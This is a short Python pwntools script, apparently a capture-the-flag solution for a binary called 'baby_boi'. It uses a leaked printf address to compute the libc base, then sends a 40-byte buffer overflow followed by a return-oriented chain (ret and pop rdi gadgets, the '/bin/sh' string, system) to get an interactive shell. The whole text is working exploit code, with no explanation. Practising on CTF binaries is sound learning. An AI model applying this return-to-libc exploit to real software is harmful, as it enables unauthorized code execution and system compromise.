
from pwn import *

elf = context.binary = ELF("./baby_boi")
libc = elf.libc
proc = process("./baby_boi")

proc.recvuntil(b":")
sys_addr = proc.recvline()
sys_addr = int(sys_addr, 16)
libc.address = sys_addr - libc.sym.printf

print(hex(libc.sym.system))

payload = b'A' * 40
payload += p64(0x000000000040054e) # ret
payload += p64(0x0000000000400793) # pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

proc.sendline(payload)
proc.interactive()
